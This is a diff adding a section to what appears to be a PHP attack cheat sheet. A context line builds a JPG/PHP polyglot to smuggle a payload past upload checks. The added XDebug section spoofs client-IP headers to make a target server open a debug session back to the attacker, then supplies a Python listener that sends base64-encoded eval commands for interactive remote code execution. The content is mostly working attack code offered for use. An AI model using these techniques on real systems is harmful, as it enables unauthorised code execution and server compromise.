@@ -172,3 +172,34 @@ payload. So the easiest way is to append to a valid file our payload:
 ```bash
 cat valid.jpg payload.php > polyglot.php.jpg
 ```
+
+
+## XDebug
+
+Make a request with the following parameters and header:
+
+```http
+GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
+...
+X-Forwarded-For: {YOUR_IP}
+HTTP_CLIENT_IP: {YOUR_IP}
+```
+
+Then on your server execute the following python script:
+
+```python
+#!/usr/bin/python2
+import socket
+
+ip_port = ('0.0.0.0', 9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+  client_data = conn.recv(1024)
+  print(client_data)
+  data = raw_input('>> ')
+  conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
+```
